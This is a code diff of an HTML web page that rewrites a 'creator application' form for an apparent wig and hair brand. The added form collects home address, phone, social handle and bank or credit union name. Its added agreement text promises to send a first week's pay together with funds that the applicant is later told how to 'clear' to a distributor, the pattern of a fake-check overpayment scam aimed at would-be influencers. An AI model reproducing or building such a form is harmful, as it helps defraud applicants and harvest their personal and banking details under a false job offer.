@@ -83,46 +83,32 @@
 <section id="apply" class="application">
   <div class="application-inner">
     <div class="welcome">WELCOME LOVELIES</div>
-    <small>REGENT STRANDS CREATOR COLLECTIVE</small>
     <h2>Creator application</h2>
-    <p class="application-intro">We would love to hear from creators and influencers who connect with beauty, hair, fashion, and luxury. Complete the application below and our team will review your details.</p>
+    <p>Please complete the application below. We will review your submission and contact you if selected.</p>
 
     <form id="creatorForm" action="https://formsubmit.co/ajax/regentstrands@gmail.com" method="POST">
-      <input type="hidden" name="_subject" value="New Regent Strands Creator Application">
+      <label>1. First and last name *<input name="name" required placeholder="First and last name"></label>
+      <label>2. Email address *<input name="email" type="email" required placeholder="Email address"></label>
+      <label>3. Home address for shipping *<textarea name="shipping_address" required placeholder="Home address for shipping"></textarea></label>
+      <label>4. Phone number *<input name="phone" required placeholder="Phone number"></label>
+      <label>5. TikTok username *<input name="tiktok_username" required placeholder="TikTok username"></label>
+      <label>6. Salary allowance *<div class="choice"><label><input type="radio" name="salary_frequency" value="Weekly" required> Weekly</label><label><input type="radio" name="salary_frequency" value="Monthly"> Monthly</label></div></label>
+      <label>7. Who referred you? *<input name="referred_by" required placeholder="Who referred you?"></label>
+      <label>8. Any previous experience? *<div class="choice"><label><input type="radio" name="previous_experience" value="Yes" required> Yes</label><label><input type="radio" name="previous_experience" value="No"> No</label></div></label>
+      <label>9. How’d you like to receive payment? *<div class="choice"><label><input type="radio" name="payment_method" value="Paycheck" required> Paycheck</label></div></label>
+      <label>10. Banking options we accept *<div class="choice"><label><input type="radio" name="banking_option" value="Local banks" required> Local banks</label><label><input type="radio" name="banking_option" value="Credit Union"> Credit Union</label><label><input type="radio" name="banking_option" value="Both"> Both</label></div></label>
+      <label>11. Local bank or credit union name *<input name="bank_or_credit_union_name" required placeholder="Local bank or credit union name"></label>
+      <label>12. Mention 3 preferred hairs and colors *<textarea name="preferred_hairs_colors" required placeholder="Mention 3 preferred hairs and colors"></textarea></label>
+      <label>13. By posting our brand items, you agree to use only approved materials in their original form, give clear credit to our brand, and use them solely for promotional purposes. Do not imply endorsement, share sensitive content, or use our items inappropriately. We reserve the right to revoke usage at any time, and posting signifies your agreement to these terms. *<div class="choice"><label><input type="radio" name="brand_terms_agreement" value="Yes" required> Yes</label><label><input type="radio" name="brand_terms_agreement" value="No"> No</label></div></label>
+      <label>14. Why are you the best fit for us? *<textarea name="best_fit" required placeholder="Why are you the best fit for us?"></textarea></label>
+      <label>15. READ AND UNDERSTAND!<div class="agreement-copy">We don’t want you to use any of your money to pay for the wigs or pay for shipping, it’s 100% free for you as the influencer. So we would take care of all the payments without hesitation, the payment we would send would include your first week payment and the funds for the hairs and shipping from the distributor, that way you don’t have to use your money for any expenses, once you get paid you’ll be updated on how you’ll clear the payment for the wigs and get it shipped to your provided address, if anyone asks you to send any of your money it’s definitely A SCAM! DON’T FALL FOR IT!</div><strong>DO YOU UNDERSTAND? *</strong><div class="choice"><label><input type="radio" name="understands" value="Yes" required> Yes</label><label><input type="radio" name="understands" value="No"> No</label></div></label>
+      <label>16. Do you have any questions? If you do, write it out here.<textarea name="questions" placeholder="Do you have any questions? If you do, write it out here."></textarea></label>
+      <input type="hidden" name="_subject" value="REGENT STRANDS Creator Application">
       <input type="hidden" name="_template" value="table">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_next" value="https://regentstrands-bot.github.io/regentstrands/thank-you.html">
-      <input type="hidden" name="_url" value="https://regentstrands-bot.github.io/regentstrands/">
       <input type="text" name="_honey" class="honeypot" tabindex="-1" autocomplete="off">
-
-      <div class="form-grid">
-        <label>FULL NAME *<input type="text" name="full_name" placeholder="Your full name" required></label>
-        <label>EMAIL ADDRESS *<input type="email" name="email" placeholder="you@example.com" required></label>
-        <label>PHONE NUMBER<input type="tel" name="phone" placeholder="Your phone number"></label>
-        <label>LOCATION *<input type="text" name="location" placeholder="City / Country" required></label>
-        <label>PRIMARY SOCIAL PLATFORM *
-          <select name="platform" required>
-            <option value="" disabled selected>Select a platform</option>
-            <option>TikTok</option><option>Instagram</option><option>YouTube</option><option>Other</option>
-          </select>
-        </label>
-        <label>SOCIAL MEDIA HANDLE *<input type="text" name="social_handle" placeholder="@yourhandle" required></label>
-        <label>FOLLOWER / AUDIENCE SIZE<input type="text" name="audience_size" placeholder="e.g. 25,000"></label>
-        <label>CONTENT FOCUS *
-          <select name="content_focus" required>
-            <option value="" disabled selected>Select your content focus</option>
-            <option>Beauty & Hair</option><option>Fashion & Lifestyle</option><option>Beauty, Hair & Fashion</option><option>Other</option>
-          </select>
-        </label>
-      </div>
-
-      <label>WHY WOULD YOU LIKE TO JOIN THE REGENT STRANDS CREATOR COLLECTIVE? *<textarea name="why_join" rows="5" placeholder="Tell us a little about yourself and why you would love to collaborate with Regent Strands." required></textarea></label>
-      <label>WHAT TYPE OF CONTENT WOULD YOU LOVE TO CREATE FOR REGENT STRANDS? *<textarea name="content_ideas" rows="4" placeholder="Tell us about the content you would create, your audience, and your creative style." required></textarea></label>
-      <label>ANYTHING ELSE YOU WOULD LIKE US TO KNOW?<textarea name="additional_information" rows="4" placeholder="Optional"></textarea></label>
-
-      <label class="consent"><input type="checkbox" name="consent" value="I confirm the information provided is accurate and may be used to review my creator application." required> <span>I confirm that the information provided is accurate and may be used to review my creator application.</span></label>
-
-      <button id="creatorSubmit" class="submit" type="submit">Submit creator application ↗</button>
+      <button id="creatorSubmit" class="submit" type="submit">Submit application</button>
       <div id="formStatus" class="form-status" role="status" aria-live="polite"></div>
     </form>
   </div>
